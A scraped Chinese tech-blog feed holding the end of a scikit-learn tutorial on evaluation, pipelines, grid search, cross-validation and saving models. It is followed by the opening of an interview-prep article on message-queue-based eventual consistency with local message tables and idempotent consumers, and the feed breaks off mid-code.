<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n混淆矩阵:"</span>)
<span class="hljs-built_in">print</span>(confusion_matrix(y_test, y_pred))

<span class="hljs-comment"># 详细报告</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n分类报告:"</span>)
<span class="hljs-built_in">print</span>(classification_report(y_test, y_pred))
</code></pre>
<h2 data-id="heading-6">六、特征工程</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.feature_selection <span class="hljs-keyword">import</span> SelectKBest, f_classif
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.pipeline <span class="hljs-keyword">import</span> Pipeline

<span class="hljs-comment"># 1. 特征选择（选最重要的K个特征）</span>
selector = SelectKBest(score_func=f_classif, k=<span class="hljs-number">2</span>)
X_selected = selector.fit_transform(X_train, y_train)

<span class="hljs-comment"># 2. 降维（PCA）</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)  <span class="hljs-comment"># 降到2维</span>
X_pca = pca.fit_transform(X_train)

<span class="hljs-comment"># 3. 管道（把多个步骤串起来）</span>
pipeline = Pipeline([
    (<span class="hljs-string">'scaler'</span>, StandardScaler()),
    (<span class="hljs-string">'selector'</span>, SelectKBest(k=<span class="hljs-number">2</span>)),
    (<span class="hljs-string">'classifier'</span>, RandomForestClassifier(random_state=<span class="hljs-number">42</span>))
])

pipeline.fit(X_train, y_train)
score = pipeline.score(X_test, y_test)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"管道模型准确率: <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-7">七、找最优参数</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> GridSearchCV

<span class="hljs-comment"># 定义要调的参数</span>
param_grid = {
    <span class="hljs-string">'n_estimators'</span>: [<span class="hljs-number">50</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>],
    <span class="hljs-string">'max_depth'</span>: [<span class="hljs-literal">None</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>],
    <span class="hljs-string">'min_samples_split'</span>: [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>]
}

<span class="hljs-comment"># 网格搜索</span>
rf = RandomForestClassifier(random_state=<span class="hljs-number">42</span>)
grid_search = GridSearchCV(
    rf, 
    param_grid, 
    cv=<span class="hljs-number">5</span>,  <span class="hljs-comment"># 5折交叉验证</span>
    scoring=<span class="hljs-string">'accuracy'</span>,
    n_jobs=-<span class="hljs-number">1</span>  <span class="hljs-comment"># 用所有CPU核心</span>
)

grid_search.fit(X_train, y_train)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"最佳参数:"</span>, grid_search.best_params_)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"最佳分数:"</span>, grid_search.best_score_)

<span class="hljs-comment"># 用最佳参数训练最终模型</span>
best_model = grid_search.best_estimator_
</code></pre>
<h2 data-id="heading-8">八、交叉验证</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score, KFold

<span class="hljs-comment"># 简单交叉验证</span>
scores = cross_val_score(
    RandomForestClassifier(random_state=<span class="hljs-number">42</span>),
    X, y,
    cv=<span class="hljs-number">5</span>,  <span class="hljs-comment"># 5折</span>
    scoring=<span class="hljs-string">'accuracy'</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"交叉验证平均准确率: <span class="hljs-subst">{scores.mean():<span class="hljs-number">.3</span>f}</span> (±<span class="hljs-subst">{scores.std():<span class="hljs-number">.3</span>f}</span>)"</span>)

<span class="hljs-comment"># 自定义交叉验证策略</span>
kf = KFold(n_splits=<span class="hljs-number">5</span>, shuffle=<span class="hljs-literal">True</span>, random_state=<span class="hljs-number">42</span>)
<span class="hljs-keyword">for</span> train_idx, val_idx <span class="hljs-keyword">in</span> kf.split(X):
    X_train_fold, X_val_fold = X[train_idx], X[val_idx]
    y_train_fold, y_val_fold = y[train_idx], y[val_idx]
    <span class="hljs-comment"># 在每折上训练和评估</span>
</code></pre>
<h2 data-id="heading-9">九、保存和加载模型</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> joblib
<span class="hljs-keyword">import</span> pickle

model = RandomForestClassifier(random_state=<span class="hljs-number">42</span>)
model.fit(X_train, y_train)

<span class="hljs-comment"># 保存模型</span>
joblib.dump(model, <span class="hljs-string">'model.joblib'</span>)  <span class="hljs-comment"># sklearn推荐</span>
<span class="hljs-comment"># 或者</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'model.pkl'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
    pickle.dump(model, f)

<span class="hljs-comment"># 加载模型</span>
loaded_model = joblib.load(<span class="hljs-string">'model.joblib'</span>)
predictions = loaded_model.predict(X_test)
</code></pre>
<p>上面学会后，就可以基于下面的流程模板自己玩一下。</p>
<h2 data-id="heading-10">机器学习工作流程模板</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ml_workflow</span>(<span class="hljs-params">X, y</span>):
    <span class="hljs-string">"""标准机器学习流程"""</span>
    <span class="hljs-comment"># 1. 划分数据</span>
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)
    
    <span class="hljs-comment"># 2. 数据预处理</span>
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)
    
    <span class="hljs-comment"># 3. 训练模型</span>
    model = RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)
    model.fit(X_train_scaled, y_train)
    
    <span class="hljs-comment"># 4. 评估</span>
    train_score = model.score(X_train_scaled, y_train)
    test_score = model.score(X_test_scaled, y_test)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"训练集准确率: <span class="hljs-subst">{train_score:<span class="hljs-number">.3</span>f}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试集准确率: <span class="hljs-subst">{test_score:<span class="hljs-number">.3</span>f}</span>"</span>)
    
    <span class="hljs-keyword">return</span> model, scaler
</code></pre>
<p>sklearn的设计哲学是“一致性”——所有模型都有fit、predict、score方法，用起来都一个套路。把上面这些掌握了，80%的机器学习任务都能应付。剩下的20%，知道去哪里查文档就行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案]]></title>    <link>https://juejin.cn/post/7579851956211548212</link>    <guid>https://juejin.cn/post/7579851956211548212</guid>    <pubDate>2025-12-05T02:24:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579851956211548212" data-draft-id="7579889969985962035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案"/> <meta itemprop="keywords" content="面试,分布式"/> <meta itemprop="datePublished" content="2025-12-05T02:24:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小胖"/> <meta itemprop="url" content="https://juejin.cn/user/1992752269369870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992752269369870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小胖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:24:30.000Z" title="Fri Dec 05 2025 02:24:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>面试官</strong>："请详细解释异步确保型事务的原理，并说明如何通过消息队列实现分布式事务的最终一致性？"</p>
</blockquote>
<p>异步确保型事务是现代分布式系统中解决数据一致性问题的重要模式，通过将同步阻塞操作改为异步执行，显著提升系统性能。</p>
<h2 data-id="heading-0">一、核心原理与架构思想</h2>
<p><strong>异步确保型事务定义</strong>：</p>
<blockquote>
<p>通过消息队列的可靠性保证，将一系列同步的事务操作修改为基于消息队列异步执行的操作，避免分布式事务中同步阻塞带来的性能下降，同时确保数据的最终一致性。</p>
</blockquote>
<p><strong>架构演进对比</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 同步阻塞模式（改造前）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncTransactionService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// 1. 创建订单（数据库操作）</span>
        orderDao.<span class="hljs-title function_">insert</span>(order); <span class="hljs-comment">// 阻塞</span>
        
        <span class="hljs-comment">// 2. 扣减库存（远程调用）</span>
        inventoryService.<span class="hljs-title function_">reduceStock</span>(order); <span class="hljs-comment">// 网络IO阻塞</span>
        
        <span class="hljs-comment">// 3. 增加积分（远程调用）  </span>
        pointsService.<span class="hljs-title function_">addPoints</span>(order); <span class="hljs-comment">// 网络IO阻塞</span>
        
        <span class="hljs-comment">// 总耗时：订单+库存+积分操作耗时之和</span>
        <span class="hljs-comment">// 性能瓶颈：同步阻塞，资源锁定时间长</span>
    }
}

<span class="hljs-comment">// 异步确保模式（改造后）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncEnsureService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">MessageQueue</span> mq;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processOrderAsync</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// 1. 创建订单（本地事务）</span>
        orderDao.<span class="hljs-title function_">insert</span>(order); <span class="hljs-comment">// 快速完成</span>
        
        <span class="hljs-comment">// 2. 发送消息（本地事务内）</span>
        mq.<span class="hljs-title function_">sendAsync</span>(<span class="hljs-string">"order_created"</span>, order); <span class="hljs-comment">// 异步非阻塞</span>
        
        <span class="hljs-comment">// 总耗时：仅订单创建时间</span>
        <span class="hljs-comment">// 性能优势：快速释放资源，异步处理后续操作</span>
    }
}
</code></pre>
<h2 data-id="heading-1">二、核心实现模式：本地消息表</h2>
<p><strong>本地消息表方案架构</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/**
 * 本地消息表实现
 * 通过数据库事务保证业务操作和消息存储的原子性
 */</span>
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@Transactional</span>
public class LocalMessageTableService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-comment">/**
     * 创建订单并保存消息（原子操作）
     */</span>
    public void <span class="hljs-built_in">createOrderWithMessage</span>(Order order) {
        <span class="hljs-comment">// 1. 业务操作：创建订单</span>
        orderDao<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 2. 同一事务：保存消息到本地表</span>
        TransactionalMessage message = new <span class="hljs-built_in">TransactionalMessage</span>();
        message<span class="hljs-selector-class">.setMessageId</span>(generateId());
        message<span class="hljs-selector-class">.setTopic</span>("order_created");
        message<span class="hljs-selector-class">.setContent</span>(order.toJson());
        message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.PENDING);
        message<span class="hljs-selector-class">.setCreateTime</span>(new Date());
        message<span class="hljs-selector-class">.setRetryCount</span>(<span class="hljs-number">0</span>);
        
        messageDao<span class="hljs-selector-class">.insert</span>(message);
        
        <span class="hljs-comment">// 事务提交后，消息和订单数据同时持久化</span>
    }
    
    <span class="hljs-comment">/**
     * 异步消息发送任务
     */</span>
    <span class="hljs-keyword">@Scheduled</span>(fixedDelay = <span class="hljs-number">5000</span>) // 每<span class="hljs-number">5</span>秒执行一次
    public void sendPendingMessages() {
        List&lt;TransactionalMessage&gt; pendingMessages = 
            messageDao<span class="hljs-selector-class">.findByStatus</span>(MessageStatus.PENDING, <span class="hljs-number">100</span>);
        
        for (TransactionalMessage message : pendingMessages) {
            try {
                <span class="hljs-comment">// 发送消息到MQ</span>
                boolean success = messageQueue<span class="hljs-selector-class">.send</span>(
                    message.getTopic(), 
                    message<span class="hljs-selector-class">.getContent</span>()
                );
                
                if (success) {
                    <span class="hljs-comment">// 更新消息状态为已发送</span>
                    message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENT);
                    message<span class="hljs-selector-class">.setSendTime</span>(new Date());
                    messageDao<span class="hljs-selector-class">.update</span>(message);
                } else {
                    <span class="hljs-comment">// 发送失败，增加重试次数</span>
                    message<span class="hljs-selector-class">.setRetryCount</span>(message.getRetryCount() + <span class="hljs-number">1</span>);
                    if (message.getRetryCount() &gt; MAX_RETRY) {
                        message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.FAILED);
                    }
                    messageDao<span class="hljs-selector-class">.update</span>(message);
                }
                
            } catch (Exception e) {
                log<span class="hljs-selector-class">.error</span>("消息发送失败: {}", message.getMessageId(), e);
                <span class="hljs-built_in">handleSendError</span>(message, e);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-2">三、消息消费端的可靠性保证</h2>
<p><strong>幂等性消费实现</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 消息消费者幂等性处理
 * 防止重复消费导致数据不一致
 */</span>
<span class="hljs-variable">@Service</span>
<span class="hljs-variable">@Slf4j</span>
public class OrderMessageConsumer {
    
    <span class="hljs-variable">@Autowired</span>
    private InventoryService inventoryService;
    
    <span class="hljs-variable">@Autowired</span>
    private ConsumeRecordDao consumeRecordDao;
    
    <span class="hljs-comment">/**
     * 处理订单创建消息（幂等）
     */</span>
    <span class="hljs-variable">@MessageListener</span>(topic = <span class="hljs-string">"order_created"</span>)
    public void <span class="hljs-built_in">handleOrderCreated</span>(String message) {
        <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">parseOrder</span>(message);
        
        <span class="hljs-comment">// 检查是否已处理过（幂等性校验）</span>
        <span class="hljs-selector-tag">if</span> (consumeRecordDao.<span class="hljs-built_in">isProcessed</span>(order.<span class="hljs-built_in">getOrderId</span>(), <span class="hljs-string">"order_created"</span>)) {
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.warn</span>(<span class="hljs-string">"消息已处理，跳过重复消费: orderId={}"</span>, order.<span class="hljs-built_in">getOrderId</span>());
            <span class="hljs-selector-tag">return</span>;
        }
        
        <span class="hljs-selector-tag">try</span> {
            <span class="hljs-comment">// 执行库存扣减</span>
            <span class="hljs-selector-tag">inventoryService</span><span class="hljs-selector-class">.reduceStock</span>(order.<span class="hljs-built_in">getProductId</span>(), order.<span class="hljs-built_in">getQuantity</span>());
            
            <span class="hljs-comment">// 记录消费成功</span>
            <span class="hljs-selector-tag">consumeRecordDao</span><span class="hljs-selector-class">.recordProcessed</span>(
                order.<span class="hljs-built_in">getOrderId</span>(), 
                <span class="hljs-string">"order_created"</span>, 
                message
            );
            
        } <span class="hljs-selector-tag">catch</span> (Exception e) {
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"处理订单消息失败: orderId={}"</span>, order.<span class="hljs-built_in">getOrderId</span>(), e);
            <span class="hljs-comment">// 抛出异常让消息队列重试</span>
            <span class="hljs-selector-tag">throw</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">RuntimeException</span>(<span class="hljs-string">"处理失败"</span>, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 库存服务幂等实现
     */</span>
    @<span class="hljs-selector-tag">Service</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">InventoryService</span> {
        
        <span class="hljs-variable">@Transactional</span>
        public void <span class="hljs-built_in">reduceStock</span>(Long productId, Integer quantity) {
            <span class="hljs-comment">// 使用版本号或状态字段实现幂等</span>
            <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">affected</span> = <span class="hljs-selector-tag">inventoryDao</span><span class="hljs-selector-class">.reduceStockWithVersion</span>(
                productId, quantity, <span class="hljs-built_in">getCurrentVersion</span>(productId));
            
            <span class="hljs-selector-tag">if</span> (affected == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 可能已经扣减过，记录日志并跳过</span>
                <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"库存可能已扣减: productId={}"</span>, productId);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-3">四、完整的事务补偿机制</h2>
<p><strong>消息补偿任务</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 消息补偿服务
 * 处理发送失败和消费失败的消息
 */</span>
<span class="hljs-variable">@Component</span>
<span class="hljs-variable">@Slf4j</span>
public class MessageCompensationService {
    
    <span class="hljs-variable">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-variable">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-variable">@Autowired</span>
    private AlertService alertService;
    
    <span class="hljs-comment">/**
     * 重试发送失败的消息
     */</span>
    <span class="hljs-variable">@Scheduled</span>(fixedDelay = <span class="hljs-number">60000</span>) <span class="hljs-comment">// 每1分钟执行一次</span>
    public void <span class="hljs-built_in">retryFailedMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">failedMessages</span> = 
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.findByStatus</span>(MessageStatus.FAILED, <span class="hljs-number">50</span>);
        
        <span class="hljs-selector-tag">for</span> (TransactionalMessage <span class="hljs-attribute">message </span>: failedMessages) {
            <span class="hljs-selector-tag">if</span> (message.<span class="hljs-built_in">getRetryCount</span>() &lt; MAX_MANUAL_RETRY) {
                <span class="hljs-selector-tag">try</span> {
                    <span class="hljs-selector-tag">boolean</span> <span class="hljs-selector-tag">success</span> = <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.send</span>(
                        message.<span class="hljs-built_in">getTopic</span>(), 
                        message.<span class="hljs-built_in">getContent</span>()
                    );
                    
                    <span class="hljs-selector-tag">if</span> (success) {
                        <span class="hljs-selector-tag">message</span><span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENT);
                        <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.update</span>(message);
                    }
                    
                } <span class="hljs-selector-tag">catch</span> (Exception e) {
                    <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"重试发送仍失败: {}"</span>, message.<span class="hljs-built_in">getMessageId</span>(), e);
                }
            } <span class="hljs-selector-tag">else</span> {
                <span class="hljs-comment">// 超过最大重试次数，需要人工干预</span>
                <span class="hljs-selector-tag">alertService</span><span class="hljs-selector-class">.alertManualIntervention</span>(
                    <span class="hljs-string">"消息发送失败需要处理"</span>, 
                    message
                );
            }
        }
    }
    
    <span class="hljs-comment">/**
     * 处理死信消息
     */</span>
    @<span class="hljs-selector-tag">Scheduled</span>(fixedDelay = <span class="hljs-number">300000</span>) <span class="hljs-comment">// 每5分钟执行一次</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">handleDeadLetterMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">DeadLetterMessage</span>&gt; <span class="hljs-selector-tag">deadLetters</span> = 
            <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.getDeadLetters</span>();
        
        <span class="hljs-selector-tag">for</span> (DeadLetterMessage <span class="hljs-attribute">deadLetter </span>: deadLetters) {
            <span class="hljs-comment">// 记录到数据库供人工处理</span>
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.saveDeadLetter</span>(deadLetter);
            <span class="hljs-selector-tag">alertService</span><span class="hljs-selector-class">.alertManualIntervention</span>(
                <span class="hljs-string">"死信消息需要处理"</span>, 
                deadLetter
            );
        }
    }
}
</code></pre>
<h2 data-id="heading-4">五、性能优化与最佳实践</h2>
<p><strong>批量消息处理优化</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 批量消息处理优化
 * 减少数据库IO和网络开销
 */</span>
<span class="hljs-variable">@Service</span>
<span class="hljs-variable">@Slf4j</span>
public class BatchMessageService {
    
    <span class="hljs-variable">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-variable">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-comment">/**
     * 批量发送消息
     */</span>
    <span class="hljs-variable">@Scheduled</span>(fixedDelay = <span class="hljs-number">10000</span>) <span class="hljs-comment">// 每10秒执行一次</span>
    public void <span class="hljs-built_in">batchSendMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">pendingMessages</span> = 
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.findByStatus</span>(MessageStatus.PENDING, <span class="hljs-number">500</span>);
        
        <span class="hljs-selector-tag">if</span> (pendingMessages.<span class="hljs-built_in">isEmpty</span>()) {
            <span class="hljs-selector-tag">return</span>;
        }
        
        <span class="hljs-comment">// 按Topic分组批量发送</span>
        <span class="hljs-selector-tag">Map</span>&lt;<span class="hljs-selector-tag">String</span>, <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt;&gt; <span class="hljs-selector-tag">messagesByTopic</span> = 
            <span class="hljs-selector-tag">pendingMessages</span><span class="hljs-selector-class">.stream</span>()
                <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">groupingBy</span>(<span class="hljs-attribute">TransactionalMessage</span>::getTopic));
        
        <span class="hljs-selector-tag">for</span> (Map.Entry&lt;String, List&lt;TransactionalMessage&gt;&gt; <span class="hljs-attribute">entry </span>: 
             messagesByTopic.<span class="hljs-built_in">entrySet</span>()) {
            
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">topic</span> = <span class="hljs-selector-tag">entry</span><span class="hljs-selector-class">.getKey</span>();
            <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">messages</span> = <span class="hljs-selector-tag">entry</span><span class="hljs-selector-class">.getValue</span>();
            
            <span class="hljs-selector-tag">try</span> {
                <span class="hljs-comment">// 批量发送</span>
                <span class="hljs-selector-tag">boolean</span> <span class="hljs-selector-tag">success</span> = <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.sendBatch</span>(
                    topic, 
                    messages.<span class="hljs-built_in">stream</span>()
                        .<span class="hljs-built_in">map</span>(<span class="hljs-attribute">TransactionalMessage</span>::getContent)
                        .<span class="hljs-built_in">collect</span>(Collectors.<span class="hljs-built_in">toList</span>())
                );
                
                <span class="hljs-selector-tag">if</span> (success) {
                    <span class="hljs-comment">// 批量更新状态</span>
